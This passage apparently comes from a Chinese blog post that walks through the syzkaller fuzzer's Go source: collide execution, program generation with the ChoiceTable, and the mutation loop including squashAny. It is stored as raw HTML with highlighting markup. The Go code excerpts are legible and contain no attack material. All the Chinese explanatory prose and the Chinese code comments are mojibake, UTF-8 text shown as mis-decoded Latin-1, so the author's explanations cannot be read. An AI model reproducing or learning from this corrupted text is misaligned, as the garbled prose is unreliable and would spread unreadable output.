class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">const</span> collideIterations = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; collideIterations; i++ &#123;<br>proc.executeRaw(proc.execOptsCollide, proc.randomCollide(p), StatCollide)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>randomCollide()</code> æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>é¦–å…ˆä¼šæœ‰ 20% çš„å‡ ç‡è°ƒç”¨ <code>prog.DoubleExecCollide()</code> ï¼ˆæŠŠæºç¨‹åºæ‹·è´ä¸€ä»½é™„åŠ åˆ°å…¶è‡ªèº«çš„æœ«ï¼Œå¹¶ä½¿ç”¨ç¬¬ä¸€éƒ¨åˆ†çš„èµ„æºï¼‰ï¼Œè‹¥æœªå‡ºé”™åˆ™ç›´æ¥è¿”å›</li><li>æ¥ä¸‹æ¥æœ‰ 20% çš„å‡ ç‡è°ƒç”¨ <code>prog.DupCallCollide()</code> ï¼ˆå°†ç¨‹åºä¸­çš„éƒ¨åˆ†è°ƒç”¨è¿›è¡Œå¤åˆ¶å¹¶æ ‡è®°ä¸ºå¼‚æ­¥ï¼‰ï¼Œè‹¥æœªå‡ºé”™åˆ™ç›´æ¥è¿”å›</li><li>æœ€åä¼šè°ƒç”¨ <code>prog.AssignRandomAsync()</code> ï¼ˆç¡®ä¿ä½¿ç”¨ä¸€ä¸ªå¼‚æ­¥è°ƒç”¨ç”Ÿäº§çš„èµ„æºçš„è°ƒç”¨ä¸å…¶è‡³å°‘é—´éš”ä¸€ä¸ªéå¼‚æ­¥è°ƒç”¨ï¼‰å¹¶æœ‰ 50% çš„å‡ ç‡è°ƒç”¨ <code>prog.AssignRandomRerun()</code>ï¼š</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> randomCollide(origP *prog.Prog) *prog.Prog &#123;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">5</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Old-style collide with a 20% probability.</span><br>p, err := prog.DoubleExecCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">4</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Duplicate random calls with a 20% probability (25% * 80%).</span><br>p, err := prog.DupCallCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br>p := prog.AssignRandomAsync(origP, proc.rnd)<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">2</span>) != <span class="hljs-number">0</span> &#123;<br>prog.AssignRandomRerun(p, proc.rnd)<br>&#125;<br><span class="hljs-keyword">return</span> p<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç”Ÿæˆæ–°è¾“å…¥-x2F-å˜å¼‚ç°æœ‰è¾“å…¥ï¼Œæ‰§è¡Œ"><a href="#ç”Ÿæˆæ–°è¾“å…¥-x2F-å˜å¼‚ç°æœ‰è¾“å…¥ï¼Œæ‰§è¡Œ" class="headerlink" title="ç”Ÿæˆæ–°è¾“å…¥&#x2F;å˜å¼‚ç°æœ‰è¾“å…¥ï¼Œæ‰§è¡Œ"></a>ç”Ÿæˆæ–°è¾“å…¥&#x2F;å˜å¼‚ç°æœ‰è¾“å…¥ï¼Œæ‰§è¡Œ</h2><p>ç»§ç»­å›åˆ° <code>loop()</code> çš„æ— é™å¾ªç¯ä¸­ï¼Œå¦‚æœè¯´å…¨å±€ <code>WorkQueue</code> ç©ºäº†ï¼Œè¯´æ˜è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¦è‡ªå·±æƒ³åŠæ³•å¼„æ–°çš„è¾“å…¥äº†ï¼Œé¦–å…ˆæˆ‘ä»¬è¦è·å– syz-fuzzer å½“å‰çš„å¿«ç…§ï¼ˆå…¶ä¸­åŒ…æ‹¬è¯­æ–™åº“ã€è¯­æ–™åº“æƒé‡å€¼ã€æ€»çš„æƒé‡å€¼ï¼‰ï¼Œä¹‹åè¿›è¡Œåˆ¤æ–­ï¼š</p><ul><li>è‹¥è¯­æ–™åº“ä¸ºç©ºï¼Œæˆ–æ˜¯å·²ç»è¿›è¡Œäº† <code>generatePeriod</code> æ¬¡å¾ªç¯ï¼Œæ­¤æ—¶è°ƒç”¨ <code>target.Generate()</code> ç”Ÿæˆæ–°çš„è¾“å…¥ç¨‹åº</li><li>å¦åˆ™ï¼Œé€‰æ‹©ä¸€ä»½ç°æœ‰çš„è¾“å…¥ï¼Œè°ƒç”¨ <code>prog.Mutate()</code> å°†è¯¥è¾“å…¥è¿›è¡Œå˜å¼‚ï¼Œç”Ÿæˆæ–°çš„è¾“å…¥</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">ct := proc.fuzzer.choiceTable<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(fuzzerSnapshot.corpus) == <span class="hljs-number">0</span> || i%generatePeriod == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Generate a new prog.</span><br>p := proc.fuzzer.target.Generate(proc.rnd, prog.RecommendedCalls, ct)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: generated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatGenerate)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Mutate an existing prog.</span><br>p := fuzzerSnapshot.chooseProgram(proc.rnd).Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, ct, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatFuzz)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ã€æ ¸å¿ƒã€‘target-Generate-ï¼šç”Ÿæˆä¸€ä¸ªæ–°çš„è¾“å…¥ç¨‹åº"><a href="#ã€æ ¸å¿ƒã€‘target-Generate-ï¼šç”Ÿæˆä¸€ä¸ªæ–°çš„è¾“å…¥ç¨‹åº" class="headerlink" title="ã€æ ¸å¿ƒã€‘target.Generate()ï¼šç”Ÿæˆä¸€ä¸ªæ–°çš„è¾“å…¥ç¨‹åº"></a>ã€æ ¸å¿ƒã€‘target.Generate()ï¼šç”Ÿæˆä¸€ä¸ªæ–°çš„è¾“å…¥ç¨‹åº</h3><p>è¯¥å‡½æ•°æœ¬ä½“å…¶å®æ¯”è¾ƒç®€çŸ­ï¼Œä¸»è¦å°±æ˜¯éšæœºç”ŸæˆæŒ‡å®šæ•°é‡çš„ç³»ç»Ÿè°ƒç”¨å¹¶æ‰“åŒ…åˆ°ä¸€ä¸ªæ–°çš„ <code>Prog</code> ç»“æ„ä½“å½“ä¸­ï¼Œç”Ÿæˆçš„ä¾æ®ä¸»è¦æ˜¯æˆ‘ä»¬å‰é¢ç»™å‡ºçš„ <code>ChoiceTable</code> è¡¨ï¼Œæœ€åç§»é™¤ç¨‹åºæœ«å°¾å¤šä½™çš„ç³»ç»Ÿè°ƒç”¨ä¾¿ç›´æ¥è¿”å›äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Generate ç”Ÿæˆä¸€ä¸ªå¸¦æœ‰ ncalls ä¸ªè°ƒç”¨çš„éšæœºç¨‹åº.</span><br><span class="hljs-comment">// ct åŒ…å«ä¸€ç»„å…è®¸çš„ç³»ç»Ÿè°ƒç”¨, è‹¥ä¸º nil åˆ™å°†ä½¿ç”¨æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> Generate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable) *Prog &#123;<br>p := &amp;Prog&#123;<br>Target: target,<br>&#125;<br>r := newRand(target, rs)<br>s := newState(target, ct, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &lt; ncalls &#123;<br>calls := r.generateCall(s, p, <span class="hljs-built_in">len</span>(p.Calls))<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> calls &#123;<br>s.analyze(c)<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls, c)<br>&#125;<br>&#125;<br><span class="hljs-comment">// å¯¹äºç”Ÿæˆçš„æœ€åä¸€ä¸ªè°ƒç”¨è€Œè¨€ï¼Œæˆ‘ä»¬æœ‰å¯èƒ½åœ¨åˆ›é€ èµ„æºçš„åŒæ—¶å¢åŠ é¢å¤–çš„ç³»ç»Ÿè°ƒç”¨ï¼Œ</span><br><span class="hljs-comment">// ä»è€Œå¯¼è‡´è°ƒç”¨æ•°é‡è¶…è¿‡ ncallsã€‚ç§»é™¤éƒ¨åˆ†è°ƒç”¨ã€‚</span><br>    <span class="hljs-comment">/* è¯‘æ³¨ï¼šä¾‹å¦‚ read éœ€è¦ä¸€ä¸ª fdï¼Œé‚£å¯èƒ½å‰é¢ä¼šå†è¡¥ä¸€ä¸ª open */</span><br><span class="hljs-comment">// åœ¨æœ€åçš„è°ƒç”¨ä¸­çš„èµ„æºä¼šè¢«æ›¿æ¢ä¸ºé»˜è®¤å€¼,è¿™ä¾¿æ˜¯æˆ‘ä»¬æ‰€æƒ³è¦çš„ã€‚</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ncalls &#123;<br>p.RemoveCall(ncalls - <span class="hljs-number">1</span>)<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">return</span> p<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒå‡½æ•°æ˜¯ <code>generateCall()</code>ï¼š</p><ul><li>é¦–å…ˆä¼šæ£€æŸ¥ <code>insertPoint</code> æ˜¯å¦ä¸ä¸º 0ï¼ˆä¸º 0 åˆ™è¯´æ˜åˆšå¼€å§‹ç”Ÿæˆç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œè‹¥æ˜¯åˆ™éšæœºé€‰å–ç¨‹åºä¸­å·²æœ‰çš„ä¸€ä¸ªè°ƒç”¨ï¼Œè‹¥å…¶æœªè®¾ç½® <code>NoGenerate</code> å±æ€§åˆ™å°†å…¶ id ï¼ˆç³»ç»Ÿè°ƒç”¨å·ï¼‰ä½œä¸º <code>biasCall</code>ï¼Œå³<strong>ç”Ÿæˆçš„ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å®Œå…¨éšæœºï¼Œåç»­ç³»ç»Ÿè°ƒç”¨åˆ™æ ¹æ®ä¼˜å…ˆçº§è¡¨è¿›è¡Œç”Ÿæˆ</strong></li><li>æ¥ä¸‹æ¥è°ƒç”¨ ChoiceTable çš„ <code>choose</code> æ–¹æ³•ï¼Œå¯¹äºç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è€Œè¨€å…¶ä¼šä» ChoiceTable ä¸­éšæœºé€‰å–ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä½œä¸º <code>biasCall</code>ï¼Œæ¥ä¸‹æ¥ä»ä¼˜å…ˆçº§è¡¨ä¸­é€‰å– <code>biasCall</code> å¯¹åº”çš„ä¼˜å…ˆçº§æ•°æ®ï¼Œä»ä¸­éšæœºé€‰å–ä¸€ä¸ªèŒƒå›´ä¸­ä¼˜å…ˆçº§æœ€é«˜çš„ä¸€ä¸ªè¿”å›</li><li>æœ€åè°ƒç”¨ <code>generateParticularCall()</code> ç”Ÿæˆè¯¥ç³»ç»Ÿè°ƒç”¨æ‰€è¦ç”¨åˆ°çš„æ•°æ®ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ct *ChoiceTable)</span></span> choose(r *rand.Rand, bias <span class="hljs-type">int</span>) <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">if</span> bias &lt; <span class="hljs-number">0</span> &#123;<span class="hljs-comment">/* ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œéšæœºé€‰æ‹© */</span><br>bias = ct.calls[r.Intn(<span class="hljs-built_in">len</span>(ct.calls))].ID<br>&#125;<br><span class="hljs-keyword">if</span> !ct.Generatable(bias) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;bias to disabled or non-generatable syscall %v\n&quot;</span>, ct.target.Syscalls[bias].Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled or non-generatable syscall&quot;</span>)<br>&#125;<br>run := ct.runs[bias]<br>x := <span class="hljs-type">int32</span>(r.Intn(<span class="hljs-type">int</span>(run[<span class="hljs-built_in">len</span>(run)<span class="hljs-number">-1</span>])) + <span class="hljs-number">1</span>)<span class="hljs-comment">/* é€‰æ‹©ä¼˜å…ˆçº§èŒƒå›´ */</span><br>res := sort.Search(<span class="hljs-built_in">len</span>(run), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> run[i] &gt;= x<br>&#125;)<br><span class="hljs-keyword">if</span> !ct.Generatable(res) &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;selected disabled or non-generatable syscall&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> res<br>&#125;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *randGen)</span></span> generateCall(s *state, p *Prog, insertionPoint <span class="hljs-type">int</span>) []*Call &#123;<br>biasCall := <span class="hljs-number">-1</span><br><span class="hljs-keyword">if</span> insertionPoint &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Choosing the base call is based on the insertion point of the new calls sequence.</span><br>insertionCall := p.Calls[r.Intn(insertionPoint)].Meta<br><span class="hljs-keyword">if</span> !insertionCall.Attrs.NoGenerate &#123;<br><span class="hljs-comment">// We must be careful not to bias towards a non-generatable call.</span><br>biasCall = insertionCall.ID<br>&#125;<br>&#125;<br>idx := s.ct.choose(r.Rand, biasCall)<br>meta := r.target.Syscalls[idx]<br><span class="hljs-keyword">return</span> r.generateParticularCall(s, meta)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ã€æ ¸å¿ƒã€‘prog-Mutate-ï¼šå˜å¼‚ä¸€ä¸ªè¾“å…¥ç¨‹åº"><a href="#ã€æ ¸å¿ƒã€‘prog-Mutate-ï¼šå˜å¼‚ä¸€ä¸ªè¾“å…¥ç¨‹åº" class="headerlink" title="ã€æ ¸å¿ƒã€‘prog.Mutate()ï¼šå˜å¼‚ä¸€ä¸ªè¾“å…¥ç¨‹åº"></a>ã€æ ¸å¿ƒã€‘prog.Mutate()ï¼šå˜å¼‚ä¸€ä¸ªè¾“å…¥ç¨‹åº</h3><p>è¯¥å‡½æ•°çš„æ ¸å¿ƒå…¶å®æ˜¯ä¸€ä¸ª<strong>éšæœºå˜å¼‚</strong>çš„å¾ªç¯ï¼Œè¿™é‡Œçš„å˜é‡ <code>r</code> ä¸ºä¸€ä¸ªéšæœºæ•°ç”Ÿæˆå™¨ï¼š</p><ul><li>ç”Ÿæˆä¸€ä¸ª <code>[0, 5)</code> ä¹‹é—´çš„éšæœºæ•°ï¼Œè‹¥ä¸º 0 åˆ™æ‰§è¡Œ <code>mutator.squashAny()</code> </li><li>ä¸Šä¸€æ¡æœªå‘½ä¸­ï¼Œåˆ™ç”Ÿæˆä¸€ä¸ª  <code>[0, 100)</code> é—´éšæœºæ•°ï¼Œè‹¥ &gt;&#x3D; 1 åˆ™æ‰§è¡Œ <code>mutator.splice()</code></li><li>ä¸Šä¸€æ¡æœªå‘½ä¸­ï¼Œåˆ™ç”Ÿæˆä¸€ä¸ª <code> [0, 31)</code> é—´éšæœºæ•°ï¼Œè‹¥ &gt;&#x3D; 20 åˆ™æ‰§è¡Œ <code>mutator.insertCall()</code></li><li>ä¸Šä¸€æ¡æœªå‘½ä¸­ï¼Œåˆ™ç”Ÿæˆä¸€ä¸ª <code>[0, 11)</code> é—´éšæœºæ•°ï¼Œè‹¥ &gt;&#x3D; 10 åˆ™æ‰§è¡Œ <code>mutateArg()</code></li><li>çš†æœªå‘½ä¸­ï¼Œæ‰§è¡Œ <code>mutator.removeCall()</code></li></ul><p>ç»ˆæ­¢å¾ªç¯çš„æ¡ä»¶æ˜¯ <code>ä¸Šè¿°å˜å¼‚æ“ä½œä¹‹ä¸€æˆåŠŸæ‰§è¡Œ &amp; ç³»ç»Ÿè°ƒç”¨æ•°ä¸ä¸º 0</code> ï¼Œæ­¤å¤–è¿˜æœ‰ 2&#x2F;3 çš„æ¦‚ç‡é‡æ–°è¿›å…¥å¾ªç¯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Mutate program p.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// p:           è¦å˜å¼‚çš„ç¨‹åº.</span><br><span class="hljs-comment">// rs:          éšæœºæ•°èµ„æºæ± .</span><br><span class="hljs-comment">// ncalls:      å˜å¼‚åç¨‹åºä¸­å…è®¸çš„æœ€å¤§è°ƒç”¨æ•°é‡.</span><br><span class="hljs-comment">// ct:          ç³»ç»Ÿè°ƒç”¨çš„ ChoiceTable.</span><br><span class="hljs-comment">// noMutate:    ä¸€ç»„ä¸è¯¥è¢«å˜å¼‚çš„ç³»ç»Ÿè°ƒç”¨çš„ ID é›†åˆ.</span><br><span class="hljs-comment">// corpus:      åŒ…æ‹¬åŸå§‹ç¨‹åº p çš„æ•´ä¸ªè¯­æ–™åº“.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> Mutate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable, noMutate <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>, corpus []*Prog) &#123;<br>r := newRand(p.Target, rs)<br><span class="hljs-keyword">if</span> ncalls &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>ncalls = <span class="hljs-built_in">len</span>(p.Calls)<br>&#125;<br>ctx := &amp;mutator&#123;<br>p:        p,<br>r:        r,<br>ncalls:   ncalls,<br>ct:       ct,<br>noMutate: noMutate,<br>corpus:   corpus,<br>&#125;<br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; <span class="hljs-built_in">len</span>(p.Calls) != <span class="hljs-number">0</span> &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> r.oneOf(<span class="hljs-number">5</span>):<br><span class="hljs-comment">// Not all calls have anything squashable,</span><br><span class="hljs-comment">// so this has lower priority in reality.</span><br>ok = ctx.squashAny()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>ok = ctx.splice()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">20</span>, <span class="hljs-number">31</span>):<br>ok = ctx.insertCall()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">10</span>, <span class="hljs-number">11</span>):<br>ok = ctx.mutateArg()<br><span class="hljs-keyword">default</span>:<br>ok = ctx.removeCall()<br>&#125;<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">if</span> got := <span class="hljs-built_in">len</span>(p.Calls); got &lt; <span class="hljs-number">1</span> || got &gt; ncalls &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad number of calls after mutation: %v, want [1, %v]&quot;</span>, got, ncalls))<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹è¿™äº”ä¸ªä¸åŒçš„å˜å¼‚æ–¹æ¡ˆ</p><h4 id="mutator-squashAny-ï¼šéšæœºå˜å¼‚ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‚æ•°"><a href="#mutator-squashAny-ï¼šéšæœºå˜å¼‚ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‚æ•°" class="headerlink" title="mutator.squashAny()ï¼šéšæœºå˜å¼‚ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‚æ•°"></a>mutator.squashAny()ï¼šéšæœºå˜å¼‚ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‚æ•°</h4><p>è¯¥å‡½æ•°ä¸€å¼€å§‹ä¼šè°ƒç”¨ <code>Prog.complexPtr()</code>ï¼Œå…¶ä¸­ä¸»è¦ä¼šè°ƒç”¨ <code>ForEachArg()</code> éå†ç”¨ä¾‹ç¨‹åºçš„å‚æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// é€‰æ‹©ä¸€ä¸ªéšæœºçš„å¤æ‚æŒ‡é’ˆå¹¶å°†å…¶å‚æ•°å˜ä¸º ANY.</span><br><span class="hljs-comment">// ä¹‹åï¼Œè‹¥ ANY ä¸­åŒ…å«æœ‰ blobï¼Œå˜å¼‚ä¸€ä¸ªéšæœºçš„ blob.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> squashAny() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br>complexPtrs := p.complexPtrs()<br></code></pre></td></tr></table></figure><p>ä¼ å…¥ç»™ <code>ForEachArg()</code> çš„å›è°ƒå‡½æ•°ä¸»è¦è°ƒç”¨ <code>isComplexPtr()</code> åˆ¤æ–­æ¯ä¸ªè°ƒç”¨çš„å‚æ•°ä¸­æ˜¯å¦å­˜åœ¨å¤æ‚æŒ‡é’ˆï¼ˆå¤šçº§æŒ‡é’ˆï¼‰ï¼Œè‹¥æ˜¯ï¼Œåˆ™å°†è¯¥è°ƒç”¨æ·»åŠ åˆ°ä½œä¸ºè¿”å›å€¼çš„æ•°ç»„ä¸­ï¼Œ<strong>å³è¿™ä¸ªå‡½æ•°å…¶å®ä¸»è¦æ˜¯é’ˆå¯¹å¤šçº§æŒ‡é’ˆçš„å˜å¼‚</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> complexPtrs() (res []complexPtr) &#123;<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> p.Calls &#123;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> ptrArg, ok := arg.(*PointerArg); ok &amp;&amp; p.Target.isComplexPtr(ptrArg) &#123;<br>res = <span class="hljs-built_in">append</span>(res, complexPtr&#123;ptrArg, c&#125;)<br>ctx.Stop = <span class="hljs-literal">true</span><br>&#125;<br>&#125;)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šä»è¿”å›åˆ—è¡¨ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªæŒ‡é’ˆï¼Œè‹¥å…¶å¯¹åº”çš„è°ƒç”¨ä¸å…è®¸å˜å¼‚åˆ™ç›´æ¥è¿”å›ï¼Œè‹¥éæŒ‡é’ˆåˆ™è°ƒç”¨ <code>squashPtr()</code> </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">ptr := complexPtrs[r.Intn(<span class="hljs-built_in">len</span>(complexPtrs))]<br><span class="hljs-keyword">if</span> ctx.noMutate[ptr.call.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> !p.Target.isAnyPtr(ptr.arg.Type()) &#123;<br>p.Target.squashPtr(ptr.arg)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šè°ƒç”¨ <code>ForEachSubArg()</code>ï¼ˆæœ¬è´¨ä¸Šä¸º <code>ForEachArgImpl()</code> çš„å°è£…ï¼‰ï¼Œå¯¹ä¹‹å‰éšæœºé€‰å–çš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°è¿›è¡Œéå†ï¼Œè¿™é‡Œä¼ å…¥çš„å›è°ƒå‡½æ•°ä¸»è¦æ˜¯æ£€æŸ¥ <code>arg.Dir()</code> æ˜¯å¦ä¸º <code>DirOut</code>ï¼Œè‹¥æ²¡æœ‰ä¸€ä¸ªå‚æ•°ç¬¦åˆåˆ™ç›´æ¥è¿”å› <code>false</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 